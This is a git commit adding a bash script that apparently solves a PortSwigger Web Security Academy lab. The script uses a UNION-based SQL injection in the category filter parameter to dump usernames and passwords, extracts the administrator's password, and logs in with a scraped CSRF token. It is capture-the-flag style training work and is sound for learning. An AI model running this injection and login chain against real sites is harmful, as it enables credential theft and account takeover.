0f89012830307b3d08cfd5fc890380f01df87b0d
Brian Hannay <brianh@carshair.com>
2021-11-05 22:32:38 -0700

    Solve retrieve-data-from-other-tables

---
+++ lab-retrieve-data-from-other-tables/run.sh
@@ -0,0 +1,54 @@
+#!/bin/bash
+
+#setup
+if [[ ${#1} -ne 32 ]]; then
+	echo "USAGE: $0 subdomain"
+	exit 1;
+fi
+url="https://$1.web-security-academy.net"
+
+# Injection method - category is improperly sanetized
+inject() {
+	curl \
+			-s \
+			-G "$url/filter" \
+			--data-urlencode "category=Accessories$1"
+}
+
+session() {
+	response="$1";
+	echo "$response" | grep '< Set-Cookie: session=' | cut -d'=' -f2 | cut -d';' -f1
+}
+
+login() {
+	username="$1";
+	password="$2";
+	csrfResponse=$(curl -v -sG "$url/login" 2>&1);
+	csrf=$(
+		echo "$csrfResponse" |
+		grep csrf |
+		grep -Eo 'value=".+?"' |
+		cut -d'"' -f2
+	);
+	
+	session=$(session "$csrfResponse");
+	redirectResponse=$(
+		curl -v "$url/login" \
+		--cookie "session=$session;" \
+		--data-raw "csrf=$csrf&username=$targetUser&password=$password" 2>&1
+	);
+
+	# Redirect to /my-account
+	session=$(session "$redirectResponse");
+	echo "$redirectResponse";
+	curl -v "$url/my-account" \
+		--cookie "session=$session;"
+}
+
+# Core logic
+targetUser="administrator";
+credentials=$(inject "' AND 1=0 UNION (SELECT username, password from users) --");
+password=$(echo "$credentials" | grep "$targetUser" -n1 | tail -n1 | cut -d'>' -f2 | cut -d'<' -f1)
+
+# Complete the lab
+login "$targetUser" "$password"
